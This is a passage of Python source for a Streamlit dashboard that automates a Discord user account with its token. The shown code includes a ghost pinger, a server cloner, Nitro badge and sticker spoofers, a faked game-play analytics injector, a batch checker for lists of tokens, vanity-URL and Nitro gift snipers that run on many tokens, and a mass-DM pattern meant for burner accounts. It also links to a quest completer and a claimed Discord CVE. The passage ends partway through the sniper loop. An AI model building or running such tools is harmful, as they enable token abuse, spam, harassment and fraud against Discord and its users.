    if st.session_state.typing_active and st.session_state.discord_token and st.session_state.channel_id:
        requests.post(f"https://discord.com/api/v9/channels/{st.session_state.channel_id}/typing", headers=get_headers(st.session_state.discord_token), timeout=5)
        time.sleep(random.randint(5, 8))
        st.rerun()


with tabs[15]:
    st.header("🔎 OSINT Search Engine")
    q_col, t_col = st.columns([3, 1])
    with q_col:
        search_query = st.text_input("Enter search query")
    with t_col:
        search_type = st.selectbox("Search Scope", ["Web", "News", "Images"])
    if st.button("Execute Intelligence Search", use_container_width=True):
        if search_query:
            log_to_console(f"🔎 Triggering clear-net indexing algorithm for keyword: {search_query}")
            with DDGS() as ddgs:
                if search_type == "Web":
                    for res in list(ddgs.text(search_query, max_results=10)):
                        st.markdown(f"### [{res['title']}]({res['href']})")
                        st.write(res['body'])
                        st.divider()
                elif search_type == "News":
                    for res in list(ddgs.news(search_query, max_results=10)):
                        st.info(f"{res['date']} - {res['source']}")
                        st.markdown(f"**[{res['title']}]({res['url']})**")
                        st.write(res['body'])
                        st.divider()
                elif search_type == "Images":
                    cols = st.columns(2)
                    for i, res in enumerate(list(ddgs.images(search_query, max_results=10))):
                        with cols[i % 2]:
                            st.image(res['image'], caption=res['title'])


with tabs[16]:
    st.header("🎭 Rich Presence (NTTS Style)")
    app_id = st.text_input("Application (Client) ID", placeholder="1234567890...").strip().replace("\r", "").replace("\n", "")
    game_name = st.text_input("Main Heading", value="about me")
    details = st.text_input("Sub-heading", value="Helping gamers out")
    st.divider()
    col_img, col_btn = st.columns(2)
    with col_img:
        large_image_key = st.text_input("Large Image Asset Key/URL", value="mp:external/...").strip().replace("\r", "").replace("\n", "")
        large_text = st.text_input("Image Hover Text", value="Verified")
    with col_btn:
        b1_label = st.text_input("Button 1 Label", value="YouTube Channel")
        b1_url = st.text_input("Button 1 URL", value="https://youtube.com").strip().replace("\r", "").replace("\n", "")
        act_status = st.selectbox("Appearance", ["online", "idle", "dnd", "invisible"], key="ntts_status")
    if st.button("✨ Apply NTTS Presence", use_container_width=True):
        if st.session_state.discord_token and app_id:
            headers = get_headers(st.session_state.discord_token)
            payload = {"status": act_status, "activities": [{"type": 0, "application_id": app_id, "name": game_name, "details": details, "assets": {"large_image": large_image_key, "large_text": large_text}, "buttons": [b1_label], "metadata": {"button_urls": [b1_url]}}]}
            res = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload, timeout=5)
            if res.status_code == 200:
                log_to_console("🎭 Custom client-profile simulation payload updated.")
                st.success("Presence Applied!")
            else:
                st.error(f"Error: {res.text}")


with tabs[17]:
    st.header("🖼️ Nitro Sticker Spoofer")
    stick_ch = st.text_input("Target Channel ID", value=st.session_state.channel_id, key="sticker_ch").strip().replace("\r", "").replace("\n", "")
    stick_id = st.text_input("Sticker ID").strip().replace("\r", "").replace("\n", "")
    if st.button("🚀 Send Spoofed Sticker", use_container_width=True):
        if stick_id and st.session_state.discord_token and stick_ch:
            h = get_headers(st.session_state.discord_token)
            sticker_url = f"https://cdn.discordapp.com/stickers/{stick_id}.png?size=160"
            requests.post(f"https://discord.com/api/v9/channels/{stick_ch}/messages", headers=h, json={"content": sticker_url}, timeout=5)
            st.success("Sticker Sent!")


with tabs[18]:
    st.header("📦 Large File Bridge")
    file_ch = st.text_input("Target Channel ID", value=st.session_state.channel_id, key="file_ch").strip().replace("\r", "").replace("\n", "")
    uploaded_file = st.file_uploader("Select File")
    if st.button("📤 Upload & Send Link", use_container_width=True):
        if uploaded_file and st.session_state.discord_token and file_ch:
            with st.spinner("Bridging file..."):
                try:
                    server = requests.get("https://api.gofile.io/getServer", timeout=10).json()['data']['server']
                    up_res = requests.post(f"https://{server}.gofile.io/uploadFile", files={'file': (uploaded_file.name, uploaded_file.getvalue())}, timeout=30).json()
                    dl_url = up_res['data']['downloadPage']
                    requests.post(f"https://discord.com/api/v9/channels/{file_ch}/messages", headers=get_headers(st.session_state.discord_token), json={"content": f"📁 **File:** {uploaded_file.name}\n🔗 {dl_url}"}, timeout=5)
                    log_to_console("📦 Bridged file reference data payload link to target channel.")
                    st.success("Sent!")
                except:
                    st.error("Bridge failure.")


with tabs[19]:
    st.header("👻 Invisible Identity")
    st.code("\u17b5", language="text")
    if st.button("Apply Invisible Bio"):
        if st.session_state.discord_token:
            requests.patch("https://discord.com/api/v9/users/@me", headers=get_headers(st.session_state.discord_token), json={"bio": "\u17b5"}, timeout=5)
            log_to_console("👤 Injected structural zero-width whitespace element to user profile biography.")
            st.success("Bio Ghosted.")


with tabs[20]:
    st.header("🌀 Bio Animator")
    bio_frames = st.text_area("Bio Frames (One per line)", "Coding...\nDeveloping...\nControl Hub Active...")
    anim_speed = st.slider("Animation Speed (Seconds)", 30, 300, 60)
    if st.button("▶️ Start Bio Animation", use_container_width=True):
        st.session_state.bio_anim_active = True
        log_to_console("🌀 Biography rotational updating frame logic active.")
    if st.button("🛑 Stop Animation", use_container_width=True):
        st.session_state.bio_anim_active = False
        log_to_console("🌀 Biography rotational updating frame logic halted.")
    if st.session_state.bio_anim_active and st.session_state.discord_token:
        frames = [f.strip() for f in bio_frames.split("\n") if f.strip()]
        if frames:
            current_frame = frames[int(time.time() / anim_speed) % len(frames)]
            requests.patch("https://discord.com/api/v9/users/@me", headers=get_headers(st.session_state.discord_token), json={"bio": current_frame}, timeout=5)
            st.write(f"Current Bio: **{current_frame}**")
            time.sleep(10)
            st.rerun()


with tabs[21]:
    st.header("👻 Ghost Pinger")
    ghost_target_id = st.text_input("User ID to Ghost Ping").strip().replace("\r", "").replace("\n", "")
    ghost_ch_id = st.text_input("Channel ID", value=st.session_state.channel_id, key="ghost_ping_ch").strip().replace("\r", "").replace("\n", "")
    if st.button("💀 Fire Ghost Ping", use_container_width=True):
        if st.session_state.discord_token and ghost_target_id and ghost_ch_id:
            h = get_headers(st.session_state.discord_token)
            ping_url = f"https://discord.com/api/v9/channels/{ghost_ch_id}/messages"
            res = requests.post(ping_url, headers=h, json={"content": f"<@{ghost_target_id}>"}, timeout=5)
            if res.status_code == 200:
                msg_id = res.json()['id']
                requests.delete(f"{ping_url}/{msg_id}", headers=h, timeout=5)
                log_to_console(f"👻 Dispatched and redacted user tag ping context vector targeting ID: {ghost_target_id}")
                st.success("Ghost Ping Delivered.")


with tabs[22]:
    st.header("📋 Server Structure Cloner")
    clone_guild_id = st.text_input("Server (Guild) ID to Clone").strip().replace("\r", "").replace("\n", "")
    if st.button("📂 Export Server Structure", use_container_width=True):
        if st.session_state.discord_token and clone_guild_id:
            h = get_headers(st.session_state.discord_token)
            log_to_console(f"📋 Exporting layout schema configurations for guild element ID: {clone_guild_id}")
            guild_data = requests.get(f"https://discord.com/api/v9/guilds/{clone_guild_id}", headers=h, timeout=5).json()
            channels = requests.get(f"https://discord.com/api/v9/guilds/{clone_guild_id}/channels", headers=h, timeout=5).json()
            clone_package = {"name": guild_data.get("name"), "roles": guild_data.get("roles"), "channels": channels}
            st.download_button("Download Clone JSON", data=json.dumps(clone_package, indent=4), file_name=f"clone_{clone_guild_id}.json")


with tabs[23]:
    st.header("💎 Nitro Badge Spoofer")
    nitro_bit = 1
    if st.button("✨ Apply Nitro Badge", use_container_width=True):
        if st.session_state.discord_token:
            h = get_headers(st.session_state.discord_token)
            user_data = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=5).json()
            current_flags = user_data.get("flags", 0)
            new_flags = current_flags | nitro_bit
            res = requests.patch("https://discord.com/api/v9/users/@me", headers=h, json={"flags": new_flags}, timeout=5)
            if res.status_code == 200:
                log_to_console(f"💎 Local profile database response flags patched to: {new_flags}")
                st.success(f"Flags successfully patched locally to: {new_flags}")
            else:
                st.error(f"Failed to patch structural status: {res.status_code}")


with tabs[24]:
    st.header("🎬 2D Animator (Advanced Multi-Profile Engine)")
    anim_ch_raw = st.text_input("Target Channel ID", value=st.session_state.channel_id, key="anim_ch_id")
    anim_ch = anim_ch_raw.strip().replace("\r", "").replace("\n", "") if anim_ch_raw else ""
    uploaded_media = st.file_uploader("Upload Target Animation Asset (GIF, MP4, MOV)", type=["gif", "mp4", "mov", "avi"])
    render_style = st.selectbox("Render Style Mapping Profile", ["Flawless 1:1 Braille Matrix (High Res)", "Ultra-Sharp Block Pixel Art (▄▀█)", "External API Cloud-Generated ASCII"])
    char_width = st.slider("Target Width Matrix (Characters)", 15, 60, 32)
    max_frames = st.slider("Max Frames Limit", min_value=5, max_value=100, value=40)
    if st.button("Run Full Deconstruction & Build Frames", use_container_width=True):
        if not uploaded_media:
            st.error("Please supply a valid media asset payload before initiating compilation.")
        else:
            with st.spinner("Extracting frames and processing matrices..."):
                try:
                    from PIL import Image, ImageSequence
                    import io
                    import cv2
                    import tempfile
                    st.session_state.converted_media_frames = []
                    compiled_frames = []
                    file_bytes = uploaded_media.read()
                    file_ext = os.path.splitext(uploaded_media.name)[1].lower()

                    def target_render_frame(pil_img, style, target_w):
                        orig_w, orig_h = pil_img.size
                        if style == "Flawless 1:1 Braille Matrix (High Res)":
                            char_h = max(1, int((orig_h / orig_w) * target_w))
                            pixel_w = target_w * 2
                            pixel_h = char_h * 4
                            gray_img = pil_img.resize((pixel_w, pixel_h)).convert("L")
                            pixels = gray_img.load()
                            lines = []
                            for y in range(0, pixel_h, 4):
                                row_chars = []
                                for x in range(0, pixel_w, 2):
                                    mask = 0
                                    if pixels[x, y] > 127:
                                        mask |= 1
                                    if pixels[x, y + 1] > 127:
                                        mask |= 2
                                    if pixels[x, y + 2] > 127:
                                        mask |= 4
                                    if pixels[x + 1, y] > 127:
                                        mask |= 8
                                    if pixels[x + 1, y + 1] > 127:
                                        mask |= 16
                                    if pixels[x + 1, y + 2] > 127:
                                        mask |= 32
                                    if pixels[x, y + 3] > 127:
                                        mask |= 64
                                    if pixels[x + 1, y + 3] > 127:
                                        mask |= 128
                                    row_chars.append(chr(0x2800 + mask))
                                lines.append("".join(row_chars))
                            return "```\n" + "\n".join(lines) + "\n```"
                        elif style == "Ultra-Sharp Block Pixel Art (▄▀█)":
                            char_h = max(1, int((orig_h / orig_w) * target_w))
                            pixel_w = target_w
                            pixel_h = char_h * 2
                            gray_img = pil_img.resize((pixel_w, pixel_h)).convert("L")
                            pixels = gray_img.load()
                            lines = []
                            for y in range(0, pixel_h, 2):
                                row_chars = []
                                for x in range(0, pixel_w):
                                    top_pixel = pixels[x, y] > 127
                                    bottom_pixel = pixels[x, y + 1] > 127
                                    if top_pixel and bottom_pixel:
                                        row_chars.append("█")
                                    elif top_pixel:
                                        row_chars.append("▀")
                                    elif bottom_pixel:
                                        row_chars.append("▄")
                                    else:
                                        row_chars.append(" ")
                                lines.append("".join(row_chars))
                            return "```\n" + "\n".join(lines) + "\n```"
                        else:
                            try:
                                buffer = io.BytesIO()
                                pil_img.save(buffer, format="JPEG")
                                api_res = requests.post(f"https://asciiart.club/api/convert?width={target_w}", files={"file": ("frame.jpg", buffer.getvalue(), "image/jpeg")}, timeout=6)
                                if api_res.status_code == 200 and api_res.text.strip():
                                    return f"```\n{api_res.text.strip()}\n```"
                            except:
                                pass
                            target_h = max(1, int((orig_h / orig_w) * target_w * 0.50))
                            gray_img = pil_img.resize((target_w, target_h)).convert("L")
                            pixels_list = list(gray_img.getdata())
                            density_ramp = "$@B%8&WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1{}[]?-_+~<>i!lI;:,\"^`'. "
                            ramp_len = len(density_ramp)
                            text_map = "".join([density_ramp[int((255 - v) * (ramp_len - 1) / 255)] for v in pixels_list])
                            lines = [text_map[i:i + target_w] for i in range(0, len(text_map), target_w)]
                            return "```\n" + "\n".join(lines) + "\n```"

                    if file_ext == ".gif":
                        gif_sequence = Image.open(io.BytesIO(file_bytes))
                        frame_index = 0
                        for frame in ImageSequence.Iterator(gif_sequence):
                            if frame_index % 2 == 0:
                                compiled_frames.append(target_render_frame(frame.copy(), render_style, char_width))
                            frame_index += 1
                    else:
                        with tempfile.NamedTemporaryFile(delete=False, suffix=file_ext) as temp_video:
                            temp_video.write(file_bytes)
                            temp_path = temp_video.name
                        cap = cv2.VideoCapture(temp_path)
                        frame_count = 0
                        while cap.isOpened():
                            ret, frame_bgr = cap.read()
                            if not ret:
                                break
                            if frame_count % 3 == 0:
                                frame_rgb = cv2.cvtColor(frame_bgr, cv2.COLOR_BGR2RGB)
                                pil_frame = Image.fromarray(frame_rgb)
                                compiled_frames.append(target_render_frame(pil_frame, render_style, char_width))
                            frame_count += 1
                        cap.release()
                        try:
                            os.remove(temp_path)
                        except:
                            pass
                    if len(compiled_frames) > max_frames:
                        step = max(1, len(compiled_frames) // max_frames)
                        compiled_frames = compiled_frames[::step][:max_frames]
                    if compiled_frames:
                        st.session_state.converted_media_frames = compiled_frames
                        st.success(f"Successfully processed {len(compiled_frames)} optimized frames!")
                        log_to_console("🎬 Deconstructed asset successfully into text matrices.")
                    else:
                        st.error("Could not extract frame data trees from asset file.")
                except Exception as err:
                    st.error(f"Compilation error: {str(err)}")
                    log_to_console(f"❌ Structural failure during processing: {str(err)}")
    st.markdown("---")
    if st.button("Fire 2D Anim", use_container_width=True):
        if not st.session_state.discord_token:
            st.error("Authentication token missing.")
        elif not anim_ch:
            st.error("Target transmission channel ID missing.")
        elif not st.session_state.get("converted_media_frames"):
            st.error("No framework data cached. Build your frames first.")
        else:
            frames_to_send = st.session_state.converted_media_frames
            h_vars = get_headers(st.session_state.discord_token)
            base_url = f"https://discord.com/api/v9/channels/{str(anim_ch)}/messages"
            monitor = st.empty()
            try:
                monitor.info("Spawning parent markdown tracking node inside channel...")
                init_post = requests.post(base_url, headers=h_vars, json={"content": frames_to_send[0]}, timeout=10)
                if init_post.status_code == 200:
                    deployed_msg_id = init_post.json()["id"]
                    patch_target_url = f"{base_url}/{deployed_msg_id}"
                    for idx, frame_payload in enumerate(frames_to_send):
                        monitor.markdown(f"**Streaming Frames:** Executing Index `{idx + 1}/{len(frames_to_send)}`")
                        transaction_complete = False
                        while not transaction_complete:
                            patch_res = requests.patch(patch_target_url, headers=h_vars, json={"content": frame_payload}, timeout=10)
                            if patch_res.status_code == 200:
                                transaction_complete = True
                                time.sleep(1.0)
                            elif patch_res.status_code == 429:
                                rate_limit_data = patch_res.json()
                                time.sleep(float(rate_limit_data.get("retry_after", 1.5)) + 0.1)
                            else:
                                transaction_complete = True
                    monitor.success("✨ Sequence array streaming successfully finalized!")
                    log_to_console("✨ 2D Matrix Engine operation wrapped up safely.")
                else:
                    st.error(f"Failed to initialize parent node container: {init_post.text}")
            except Exception as stream_err:
                st.error(f"Streaming anomaly detected: {str(stream_err)}")


with tabs[25]:
    st.header("💠 Badge Spoofer — Analytics `/science` Vector")
    st.caption("Injects fake game-play events into Discord's analytics endpoint. Requires `cf_clearance` cookie.")
    col_a, col_b = st.columns(2)
    with col_a:
        cookie_input = st.text_input("cf_clearance Cookie Value", type="password", value=st.session_state.cf_clearance_cookie, key="cf_clearance_input")
        if cookie_input:
            st.session_state.cf_clearance_cookie = cookie_input.strip()
        fetch_token_btn = st.button("🔑 Fetch Analytics Token", use_container_width=True)
    with col_b:
        if st.session_state.analytics_token:
            st.success("Analytics token loaded.")
        else:
            st.info("Not fetched yet.")
        if st.button("🗑️ Clear Analytics Token", use_container_width=True):
            st.session_state.analytics_token = None
            st.success("Token cleared.")
    if fetch_token_btn:
        if not st.session_state.discord_token:
            st.error("Discord token required (sidebar).")
        else:
            tok = fetch_analytics_token(st.session_state.discord_token)
            if tok:
                st.session_state.analytics_token = tok
                log_to_console("💠 Analytics token acquired from /users/@me.")
                st.success("Analytics token fetched.")
                st.rerun()
            else:
                st.error("Failed to fetch analytics token.")
    st.divider()
    fingerprint_input = st.text_input("Executable Fingerprint (optional)", value=st.session_state.spoofer_fingerprint, key="fingerprint_input")
    if fingerprint_input:
        st.session_state.spoofer_fingerprint = fingerprint_input.strip()
    game_rows = st.text_area("Game Sessions (one per line, format: `Game Name | hours`)", value="Grand Theft Auto V | 12\nApex Legends | 8\nMinecraft | 24", height=120)
    col_send, col_stop = st.columns(2)
    with col_send:
        start_spoof = st.button("🚀 Fire Game Events", use_container_width=True)
    with col_stop:
        if st.button("🧹 Reset Session State", use_container_width=True):
            st.session_state.spoofer_running = False
            log_to_console("💠 Spoofer session state reset.")
            st.success("Reset.")
    if start_spoof:
        if not st.session_state.discord_token:
            st.error("Discord token required.")
        elif not st.session_state.analytics_token:
            st.error("Fetch the analytics token first.")
        elif not st.session_state.cf_clearance_cookie:
            st.error("cf_clearance cookie required.")
        else:
            parsed_sessions = []
            for line in game_rows.split("\n"):
                line = line.strip()
                if not line or "|" not in line:
                    continue
                parts = [p.strip() for p in line.split("|")]
                if len(parts) < 2:
                    continue
                try:
                    parsed_sessions.append((parts[0], float(parts[1])))
                except ValueError:
                    continue
            if not parsed_sessions:
                st.error("No valid `Game Name | hours` entries parsed.")
            else:
                st.session_state.spoofer_running = True
                progress = st.progress(0.0)
                status_box = st.empty()
                success_count = 0
                fail_count = 0
                for idx, (name, hours) in enumerate(parsed_sessions):
                    status_box.info(f"Injecting session: **{name}** ({hours}h)")
                    events = build_game_events(name, hours, fingerprint=st.session_state.spoofer_fingerprint or None)
                    code, body = post_science_events(st.session_state.discord_token, st.session_state.analytics_token, st.session_state.cf_clearance_cookie, events)
                    if code in (200, 204):
                        success_count += 1
                        log_to_console(f"💠 {name}: {code} accepted ({hours}h logged).")
                    else:
                        fail_count += 1
                        log_to_console(f"❌ {name}: {code} — {body[:120]}")
                    progress.progress((idx + 1) / len(parsed_sessions))
                    time.sleep(0.6)
                st.session_state.spoofer_running = False
                if fail_count == 0:
                    st.success(f"All {success_count} sessions accepted. Badges update in 1–2 days.")
                else:
                    st.warning(f"{success_count} accepted, {fail_count} failed. Check console for codes.")
                status_box.empty()


with tabs[26]:
    st.header("🤝 Friend Invite Generator")
    st.caption("Generates `discord.gg/...` links that add the clicker as a friend when used.")
    count_input = st.number_input("How many invites to generate?", min_value=1, max_value=20, value=1)
    if st.button("✨ Generate Friend Invites", use_container_width=True):
        if not st.session_state.discord_token:
            st.error("Discord token required.")
        else:
            h = get_headers(st.session_state.discord_token)
            generated = []
            for i in range(int(count_input)):
                try:
                    r = requests.post("https://discord.com/api/v9/users/@me/invites", headers=h, json={}, timeout=8)
                    if r.status_code in (200, 201):
                        code = r.json().get("code") or r.json().get("invite", {}).get("code")
                        if code:
                            generated.append(code)
                            log_to_console(f"🤝 Friend invite generated: discord.gg/{code}")
                    else:
                        log_to_console(f"❌ Friend invite failed: {r.status_code} — {r.text[:120]}")
                        st.error(f"Request {i+1} failed: {r.status_code}")
                        break
                    time.sleep(0.8)
                except Exception as e:
                    log_to_console(f"❌ Friend invite exception: {e}")
                    st.error(f"Request {i+1} errored: {e}")
                    break
            if generated:
                st.session_state.friend_invites = generated
                st.success(f"Generated {len(generated)} invite(s).")
                for code in generated:
                    st.code(f"https://discord.gg/{code}", language="text")
    if st.session_state.friend_invites:
        st.divider()
        st.subheader("📋 Previously Generated (this session)")
        for code in st.session_state.friend_invites:
            st.code(f"https://discord.gg/{code}", language="text")


with tabs[27]:
    st.header("🔑 Batch Discord Token Checker")
    token_list_input = st.text_area("Tokens (one per line)", height=200, placeholder="MTA...\nMTI...\n...")
    if st.button("🔍 Validate All Tokens", use_container_width=True):
        if not token_list_input.strip():
            st.error("Paste at least one token.")
        else:
            tokens = [t.strip() for t in token_list_input.split("\n") if t.strip()]
            results = []
            progress = st.progress(0.0)
            for idx, tok in enumerate(tokens):
                try:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=get_headers(tok), timeout=6)
                    if r.status_code == 200:
                        data = r.json()
                        snowflake = int(data.get("id", "0"))
                        created = datetime.fromtimestamp(((snowflake >> 22) + 1420070400000) / 1000.0)
                        results.append({"Token": tok[:20] + "..." + tok[-6:] if len(tok) > 28 else tok, "Status": "✅ Valid", "Username": f"{data.get('username', '?')}#{data.get('discriminator', '0')}", "ID": data.get("id", "?"), "Flags": data.get("public_flags", 0), "Created": created.strftime("%Y-%m-%d")})
                    elif r.status_code == 401:
                        results.append({"Token": tok[:20] + "..." if len(tok) > 20 else tok, "Status": "❌ Invalid", "Username": "-", "ID": "-", "Flags": "-", "Created": "-"})
                    elif r.status_code == 403:
                        results.append({"Token": tok[:20] + "..." if len(tok) > 20 else tok, "Status": "🔒 Locked", "Username": "-", "ID": "-", "Flags": "-", "Created": "-"})
                    else:
                        results.append({"Token": tok[:20] + "..." if len(tok) > 20 else tok, "Status": f"⚠️ {r.status_code}", "Username": "-", "ID": "-", "Flags": "-", "Created": "-"})
                except Exception as e:
                    results.append({"Token": tok[:20] + "..." if len(tok) > 20 else tok, "Status": "⚠️ Error", "Username": str(e)[:30], "ID": "-", "Flags": "-", "Created": "-"})
                progress.progress((idx + 1) / len(tokens))
                time.sleep(0.4)
            st.session_state.token_check_results = results
            log_to_console(f"🔑 Validated {len(results)} tokens.")
    if st.session_state.token_check_results:
        st.divider()
        st.dataframe(pd.DataFrame(st.session_state.token_check_results), use_container_width=True)
        valid_count = sum(1 for r in st.session_state.token_check_results if "Valid" in r["Status"])
        st.info(f"**{valid_count} / {len(st.session_state.token_check_results)}** tokens valid.")


with tabs[28]:
    st.header("📡 Auth-Free Guild Scraper")
    invite_input = st.text_input("Invite Code or URL", placeholder="discord.gg/abc123 or abc123")
    if st.button("🔍 Resolve Server", use_container_width=True):
        if not invite_input.strip():
            st.error("Enter an invite code.")
        else:
            code = invite_input.strip()
            if "discord.gg/" in code:
                code = code.split("discord.gg/")[-1].split("/")[0].split("?")[0]
            elif "discord.com/invite/" in code:
                code = code.split("discord.com/invite/")[-1].split("/")[0].split("?")[0]
            try:
                r = requests.get(f"https://discord.com/api/v9/invites/{code}?with_counts=true&with_expiration=true", headers={"User-Agent": "Mozilla/5.0"}, timeout=8)
                if r.status_code == 200:
                    data = r.json()
                    guild = data.get("guild", {})
                    channel = data.get("channel", {})
                    st.session_state.guild_scrape_result = data
                    col1, col2 = st.columns(2)
                    with col1:
                        st.metric("Server Name", guild.get("name", "?"))
                        st.metric("Members", f"{guild.get('member_count', '?')}")
                        st.metric("Online", f"{guild.get('presence_count', '?')}")
                        st.metric("ID", guild.get("id", "?"))
                    with col2:
                        st.metric("Verification Level", guild.get("verification_level", "?"))
                        st.metric("Premium Tier", guild.get("premium_tier", "?"))
                        st.metric("Boosts", guild.get("premium_subscription_count", "?"))
                        st.metric("Channel", f"#{channel.get('name', '?')}")
                    if guild.get("icon"):
                        st.image(f"https://cdn.discordapp.com/icons/{guild['id']}/{guild['icon']}.png?size=128", width=128)
                    if guild.get("banner"):
                        st.image(f"https://cdn.discordapp.com/banners/{guild['id']}/{guild['banner']}.png?size=512")
                    st.json(data)
                    log_to_console(f"📡 Resolved invite {code} → {guild.get('name', '?')} ({guild.get('member_count', '?')} members).")
                else:
                    st.error(f"Failed: HTTP {r.status_code} — {r.text[:150]}")
            except Exception as e:
                st.error(f"Error: {e}")


with tabs[29]:
    st.header("🧪 Nitro Plugin Payload Generator")
    plugin_choice = st.selectbox("Plugin", ["Vencord FakeNitro", "BetterDiscord YABDP4Nitro"])
    if plugin_choice == "Vencord FakeNitro":
        st.subheader("Vencord FakeNitro Settings")
        emoji_hyperlink = st.toggle("Emoji Hyperlink Bypass", value=True)
        emoji_hyperlink_text = st.text_input("Hyperlink Text Template", value="{{NAME}}")
        sticker_bypass = st.toggle("Sticker Bypass", value=True)
        stream_quality = st.toggle("Stream Quality Bypass", value=True)
        st.code(json.dumps({"enabled": True, "enableEmojiBypass": emoji_hyperlink, "emojiBypassLinkText": emoji_hyperlink_text, "enableStickerBypass": sticker_bypass, "enableStreamQualityBypass": stream_quality}, indent=4), language="json")
    else:
        st.subheader("YABDP4Nitro Settings")
        streaming = st.toggle("Streaming Quality Bypass", value=True)
        emotes = st.toggle("Cross-Server Emotes", value=True)
        profile_effects = st.toggle("Fake Profile Effects", value=True)
        banners = st.toggle("Fake Profile Banners", value=True)
        decorations = st.toggle("Fake Avatar Decorations", value=True)
        clips = st.toggle("Clips 100MB Limit Bypass", value=True)
        st.code(json.dumps({"streaming": {"enabled": streaming}, "emotes": {"enabled": emotes}, "profile": {"effects": profile_effects, "banners": banners, "decorations": decorations}, "clips": {"enabled": clips}}, indent=4), language="json")
    st.divider()
    st.markdown("**Installation links:**")
    st.markdown("- [Vencord](https://vencord.dev/download)")
    st.markdown("- [YABDP4Nitro](https://github.com/riolubruh/YABDP4Nitro)")


with tabs[30]:
    st.header("🛠️ Steam AppManifest Generator")
    col1, col2 = st.columns(2)
    with col1:
        app_id_input = st.text_input("Steam App ID", value="271590")
        game_name_input = st.text_input("Game Name", value="Grand Theft Auto V")
    with col2:
        install_dir_input = st.text_input("Install Dir (folder name)", value="Grand Theft Auto V")
        steam_id_input = st.text_input("Steam ID (optional)", value="0")
    if st.button("📄 Generate .acf", use_container_width=True):
        if not app_id_input or not game_name_input or not install_dir_input:
            st.error("Fill in App ID, Game Name, and Install Dir.")
        else:
            st.session_state.steam_acf_output = generate_steam_appmanifest(app_id_input.strip(), game_name_input.strip(), install_dir_input.strip(), steam_id_input.strip() or "0")
            log_to_console(f"🛠️ Generated appmanifest_{app_id_input}.acf for {game_name_input}.")
    if st.session_state.steam_acf_output:
        st.divider()
        st.code(st.session_state.steam_acf_output, language="text")
        st.download_button("📥 Download .acf", data=st.session_state.steam_acf_output, file_name=f"appmanifest_{app_id_input}.acf", mime="text/plain")


with tabs[31]:
    st.header("🎯 Discord Quest Completer — Guide")
    st.warning("⚠️ **Enforcement active.** Use on accounts you can lose.")
    with st.expander("📥 Download & Installation", expanded=True):
        st.markdown("**Repo:** [github.com/nyxxbit/discord-quest-completer](https://github.com/nyxxbit/discord-quest-completer)\n\nSupports all five quest types including `ACHIEVEMENT_IN_ACTIVITY`.")


with tabs[32]:
    st.header("💻 macOS Remote Debugging Port — Research")
    st.error("⚠️ Local attack vector. Requires local access.")
    with st.expander("🔍 Vulnerability Summary", expanded=True):
        st.markdown("**Target:** Discord macOS Stable 0.0.373\n\n**Repo:** [github.com/NiceTop1027/CVE-2026-Discord](https://github.com/NiceTop1027/CVE-2026-Discord)")


with tabs[33]:
    st.header("📨 Mass DM Tool — Guide")
    st.warning("⚠️ **High ban risk.** Use on burners only.")
    with st.expander("🛠️ Implementation Pattern"):
        st.code('''def mass_dm(token, user_ids, message, delay=4.0):
    headers = get_headers(token)
    for uid in user_ids:
        r = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipient_id": uid}, timeout=8)
        if r.status_code != 200:
            continue
        requests.post(f"https://discord.com/api/v9/channels/{r.json()['id']}/messages", headers=headers, json={"content": message}, timeout=8)
        time.sleep(delay)''', language="python")


with tabs[34]:
    st.header("🏃 Vanity URL Sniper")
    col1, col2 = st.columns(2)
    with col1:
        vanity_target = st.text_input("Target Vanity Code", key="vanity_target_input", placeholder="mydreamserver")
        guild_id_input = st.text_input("Your Server (Guild) ID", key="vanity_guild_id")
    with col2:
        snipe_tokens = st.text_area("Tokens (one per line)", height=100, key="vanity_tokens")
        snipe_delay = st.slider("Check interval (seconds)", 0.1, 5.0, 0.5)
    col_start, col_stop = st.columns(2)
    with col_start:
        start_vanity = st.button("🚀 Start Vanity Sniper", use_container_width=True)
    with col_stop:
        stop_vanity = st.button("🛑 Stop Vanity Sniper", use_container_width=True)
    if start_vanity:
        if not vanity_target or not guild_id_input or not snipe_tokens.strip():
            st.error("Target, guild ID, and at least one token required.")
        else:
            st.session_state.vanity_sniper_running = True
            token_list = [t.strip() for t in snipe_tokens.split("\n") if t.strip()]
            log_to_console(f"🏃 Vanity sniper armed: '{vanity_target}' — {len(token_list)} token(s).")
            check_count = 0
            while st.session_state.vanity_sniper_running and check_count < 100:
                check_count += 1
                for tok in token_list:
                    try:
                        check_r = requests.get(f"https://discord.com/api/v9/invites/{vanity_target}", headers=get_headers(tok), timeout=5)
                        if check_r.status_code == 404:
                            claim_r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id_input}/vanity-url", headers=get_headers(tok), json={"code": vanity_target}, timeout=8)
                            if claim_r.status_code == 200:
                                st.success(f"🎉 CLAIMED: discord.gg/{vanity_target}")
                                log_to_console(f"🏃 VANITY CLAIMED: discord.gg/{vanity_target}")
                                st.session_state.vanity_sniper_running = False
                                break
                    except:
                        pass
                if st.session_state.vanity_sniper_running:
                    time.sleep(snipe_delay)
                    log_to_console(f"🏃 Check #{check_count} — not available yet.")
                    st.rerun()
    if stop_vanity:
        st.session_state.vanity_sniper_running = False
        log_to_console("🏃 Vanity sniper stopped.")
        st.rerun()


with tabs[35]:
    st.header("💎 Nitro Sniper")
    nitro_tokens = st.text_area("Tokens (one per line)", height=150, key="nitro_tokens")
    auto_claim = st.toggle("Auto-Claim Gifts", value=True)
    if st.button("🚀 Start Nitro Sniper", use_container_width=True):
        if not nitro_tokens.strip():
            st.error("Paste at least one token.")
        else:
            st.session_state.nitro_sniper_running = True
            token_list = [t.strip() for t in nitro_tokens.split("\n") if t.strip()]
            log_to_console(f"💎 Nitro sniper armed — {len(token_list)} token(s).")
            scan_count = 0
            while st.session_state.nitro_sniper_running and scan_count < 20:
                scan_count += 1
                for tok in token_list:
                    try:
                        guilds_r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=get_headers(tok), timeout=6)
                        if guilds_r.status_code == 200:
                            for g in guilds_r.json()[:5]:
                                ch_r = requests.get(f"https://discord.com/api/v9/guilds/{g['id']}/channels", headers=get_headers(tok), timeout=6)
                                if ch_r.status_code == 200:
                                    for ch in ch_r.json()[:3]:
                                        if ch.get("type") == 0:
                                            msg_r = requests.get(f"https://discord.com/api/v9/channels/{ch['id']}/messages?limit=5", headers=get_headers(tok), timeout=6)
